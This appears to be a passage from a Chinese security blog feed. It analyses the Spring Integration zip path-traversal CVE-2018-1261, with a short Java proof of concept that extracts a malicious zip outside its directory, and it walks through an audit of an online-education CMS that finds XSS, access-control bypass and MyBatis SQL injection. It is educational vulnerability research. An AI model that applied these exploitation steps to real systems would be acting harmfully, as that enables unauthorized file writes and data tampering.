恶意压缩包文件内容</h3><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fvcqke6logj30ww060408.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fvcqjturymj31eg04otap.jpg" alt=""></p><h3 id="3-2-测试代码如下"><a href="#3-2-测试代码如下" class="headerlink" title="3.2 测试代码如下"></a>3.2 测试代码如下</h3><p>在<code>unZipTransformer.setWorkDirectory(path);</code>设置了解压文件的路径，CVE-2018-1261目录下会生成good.txt文件，而eval文件就会逃出限制，在根目录生成文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.io.DefaultResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.support.MessageBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.zip.transformer.UnZipTransformer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceLoader resourceLoader = <span class="keyword">new</span> DefaultResourceLoader();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File path =  <span class="keyword">new</span> File(<span class="string">"./CVE-2018-1261/"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Resource evilResource = resourceLoader.getResource(<span class="string">"classpath:zip-malicious-traversal.zip"</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            InputStream evilIS = evilResource.getInputStream();</span><br><span class="line">            Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</span><br><span class="line">            UnZipTransformer unZipTransformer = <span class="keyword">new</span> UnZipTransformer();</span><br><span class="line">            <span class="comment">//设置解压文件的目录为CVE-2018-1261</span></span><br><span class="line">            unZipTransformer.setWorkDirectory(path);</span><br><span class="line">            unZipTransformer.afterPropertiesSet();</span><br><span class="line">            <span class="comment">//漏洞入口点</span></span><br><span class="line">            unZipTransformer.transform(evilMessage);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例中的UnZipTransformer.transform()会调用<code>doZipTransform()</code>来处理压缩包，</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fvcqjhigupj31em0do40o.jpg" alt=""></p><p>在遍历压缩包内目录及文件时，回调ZipEntryCallback中的process()对其进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ZipUtil.iterate(inputStream, <span class="keyword">new</span> ZipEntryCallback() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(InputStream zipEntryInputStream, ZipEntry zipEntry)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">final</span> String zipEntryName = zipEntry.getName();</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (ZipResultType.FILE.equals(zipResultType)) &#123;</span><br><span class="line">            <span class="keyword">final</span> File tempDir = <span class="keyword">new</span> File(workDirectory, message.getHeaders().getId().toString());</span><br><span class="line">            tempDir.mkdirs(); <span class="comment">//NOSONAR false positive</span></span><br><span class="line">            <span class="keyword">final</span> File destinationFile = <span class="keyword">new</span> File(tempDir, zipEntryName);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> (zipEntry.isDirectory()) &#123; ...   &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                SpringZipUtils.copy(zipEntryInputStream, destinationFile);</span><br><span class="line">                uncompressedData.put(zipEntryName, destinationFile);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>../../../那一串是通过<code>zipEntry.getName()</code>得到的</p><p><code>final File destinationFile = new File(tempDir, zipEntryName);</code>确定解压目录</p><p>接着就是调用copy</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fvcqiumklej31700aa3zr.jpg" alt=""></p><p>获取传过来的输入数据以及从文件系统中的某个文件中获得输入字节，把数据写到destinationFile处</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fvcqh13em8j31kw0woqfq.jpg" alt=""></p><p>要在根目录下创建tmp文件夹</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fvcqgf5wdbj31kw0dp78i.jpg" alt=""></p><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><ul><li><a href="https://pivotal.io/security/cve-2018-1261" target="_blank" rel="noopener">https://pivotal.io/security/cve-2018-1261</a></li><li><a href="https://github.com/spring-projects/spring-integration-extensions/" target="_blank" rel="noopener">https://github.com/spring-projects/spring-integration-extensions/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JAVA代码审计 | 因酷网校在线教育系统</title>
      <link href="/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9B%A0%E9%85%B7%E7%BD%91%E6%A0%A1%E5%9C%A8%E7%BA%BF%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F/"/>
      <url>/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9B%A0%E9%85%B7%E7%BD%91%E6%A0%A1%E5%9C%A8%E7%BA%BF%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h1 id="CMS简介："><a href="#CMS简介：" class="headerlink" title="CMS简介："></a>CMS简介：</h1><p>  &ensp;&ensp;&ensp;因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p><blockquote><p>核心框架—Spring Framework<br> 视图框架—Spring MVC<br> 持久层框架—MyBatis 3</p></blockquote><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境:"></a>测试环境:</h1><ul><li>JDK 1.8.8</li><li>Tomcat 7</li><li>Mysql 5.5</li><li>maven 3.5.3</li><li>IntelliJ IDEA 2018.01</li></ul><h1 id="系统安装："><a href="#系统安装：" class="headerlink" title="系统安装："></a>系统安装：</h1><p><a href="http://down.admin5.com/jsp/132874.html" target="_blank" rel="noopener">下载地址：</a><a href="http://down.admin5.com/jsp/132874.html" target="_blank" rel="noopener">http://down.admin5.com/jsp/132874.html</a></p><p>1、首先导入源码，修改相关的配置信息，注意要和数据库的信息相对应</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1rrrpruj31kw0re446.jpg" alt=""></p><p>2、在pom.xml中把端口号改成8080，这个可根据自己的实际情况去修改，我这里端口设置的是8080，所以端口号改成8080</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo1rzzs17j311e0hyad5.jpg" alt=""></p><p>3、配置Tomcat</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1sjkam9j31kw0dngog.jpg" alt=""></p><p>4、导入项目时会下载maven下的包，启动时会读取配置文件，所以刚刚导入项目和运行Tomcat时都会有一些慢</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1srwjxpj31kw0rg45y.jpg" alt=""></p><h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="1、maven结构："><a href="#1、maven结构：" class="headerlink" title="1、maven结构："></a>1、maven结构：</h2><ul><li><code>src/main/java</code>：是java的代码目录</li><li><code>src/main/resources</code>：是资源目录，放一些配置文件，如properties、spring-mvc.xml等</li><li><code>src/main/webapp</code>：是传统项目的WebContent目录</li></ul><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1t65wa3j30e00p40um.jpg" alt=""></p><h2 id="2、Mybatis："><a href="#2、Mybatis：" class="headerlink" title="2、Mybatis："></a>2、Mybatis：</h2><ul><li><code>Mybatis</code>是作为一款半自动化的持久层框架，因为sql语句都要我们自己手动编写还要注意安全问题，所以Mybatis在一定程度上帮我们避免了这些问题</li><li>但是Mybatis不意味着一定的安全，它总共有两个参数#<code>{id}</code>和<code>${id}</code></li></ul><blockquote><p><code>#{id}</code>：相当于JDBC中的PreparedStatement，预编译处理参数，可以有效的避免注入<br><code>${id}</code>：是未经过预编译，仅仅取输出变量的值</p></blockquote><h2 id="3、Spring-MVC工作流程："><a href="#3、Spring-MVC工作流程：" class="headerlink" title="3、Spring MVC工作流程："></a>3、Spring MVC工作流程：</h2><p>1.用户发送http请求给前端控制器(DispatcherServlet)，前端控制器(DispatcherServlet)接到http请求后查询HandlerMapping，然后选择合适的控制器(Controller)。</p><p>2.控制器(Controller)根据不同的业务逻辑调用不同的服务方法／业务对象来获取模型数据(Model),并返回ModelAndView(模型数据和逻辑视图名)给前端控制器(DispatcherServlet)。</p><p>3.前端控制器(DispatcherServlet)根据返回的逻辑视图名，在ViewResolver的帮助下，选择相应的视图(View)进行渲染。</p><p>4.当View确定后，前端控制器(DispatcherServlet)就把模型数据传给视图(View)，以便渲染视图，响应用户的发出的请求。</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1tpzqncj31aw0o6dks.jpg" alt=""></p><h2 id="4、Spring："><a href="#4、Spring：" class="headerlink" title="4、Spring："></a>4、Spring：</h2><p>充当了管理容器的角色，用来管理Spring MVC和Mybatis工作的，充当程序中的桥梁或者说管理者</p><h3 id="Spring的两大核心"><a href="#Spring的两大核心" class="headerlink" title="Spring的两大核心"></a>Spring的两大核心</h3><blockquote><p>控制反转（IoC）/依赖注入（DI）<br>面向切面编程（AOP）</p><ul><li>可以与第三方框架良好整合，降低框架的使用难度，提供对各种优秀框架的支持，如Struts、Hibernate等</li><li>降低Java EE API的使用难度，可以通过Spring建议封装</li><li>依赖注入特性将组件透明化，降低耦合度</li></ul></blockquote><h1 id="源码审计："><a href="#源码审计：" class="headerlink" title="源码审计："></a>源码审计：</h1><p>这里只是抛砖引玉给大家讲一下java代码审计的流程，基于SSM框架的一个思路，如果大家有时间可以深入挖掘一下这套程序，一定会有比较多的收获</p><h2 id="1、XSS"><a href="#1、XSS" class="headerlink" title="1、XSS"></a>1、XSS</h2><p>漏洞发生在搜索课程名称，我们定位到<code>CourseController.java</code>这里</p><p><code>@Autowired注解</code>是自动连接属性传递的时，Spring会将这些传递过来的值或者引用自动分配给那些属性以便我们利用，这里我们可以调用<code>CourseService</code>接口里面的方法<br>跟进接口，可以看到定义接口的一些方法，我们可以找到查询课程相关的接口，其中第61行<code>queryCourseList接口</code>是根据不同条件查询课程列表</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1xuxg0nj31h00niq83.jpg" alt=""></p><p>再根据查询相关的接口在定义接口的实现类里查询具体实现的方法，如49行，在<code>CourseMapper</code>中进行数据库查询，直接返回一个list集合</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1uosbh5j31g20u2gs2.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1uubmcvj31fg0nmn24.jpg" alt=""></p><p>这里是<code>CourseMapper</code>中对应查询queryCourseList的sql语句</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1v1mpwgj31kw06gwha.jpg" alt=""></p><p>然后直接将内容返回到前台的页面上，其实<code>${queryCourse.courseName}</code>是一个EL表达式，代表queryCourse这个实体类下面courseName的值，就是我们查询课程的内容</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuokdlc205j314u0godjq.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1yu3uyxj31kw0hrwku.jpg" alt=""></p><h2 id="2、越权漏洞"><a href="#2、越权漏洞" class="headerlink" title="2、越权漏洞"></a>2、越权漏洞</h2><p>漏洞触发点<code>UserController.java</code></p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo1z3u3gqj31kw0mq794.jpg" alt=""></p><p>我们跟进定义的接口，并进入接口的实现类来看看修改用户信息内容中是否有用户权限判断</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1zccnlxj30xy05smxq.jpg" alt=""></p><p>第91行，接口实现类中并未做任何用户身份合法性的校验，对请求没进行权限控制</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1zjcz8oj30ye0acdhi.jpg" alt=""></p><p>直接引用mapper文件更新信息</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1zs0tbcj30ye0acdhi.jpg" alt=""></p><p>这里直接贴图，抓包修改对应的user.userId</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo201a907j31kw0kswkp.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo207sxstj30pe0pa75p.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20e76ahj31kw0d2n5c.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo20jffpij31jq0zctco.jpg" alt=""></p><h2 id="3、SQL注入漏洞"><a href="#3、SQL注入漏洞" class="headerlink" title="3、SQL注入漏洞"></a>3、SQL注入漏洞</h2><p><code>AdminArticleController.java</code>删除文章页面，从前台接收articelId参数</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20sd4jmj318k0k0djs.jpg" alt=""></p><p>接口和接口实现类</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20xvda4j312s0eemz5.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo219ayg7j31au03gt9d.jpg" alt=""></p><p>关键点在这里，我们上面提过Mybatis用${}直接拼接，会产生注入</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo21fxd47j316w04idgv.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo21piumuj31kw0byaf6.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo21vkuvbj30y40bygp7.jpg" alt=""></p><p>类似的注入点和其他漏洞还有很多，只要大家细心就会找到的。这里只是提出三个比较有代表性的漏洞举个例子，让大家对SSM框架的审计有一个思路。</p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
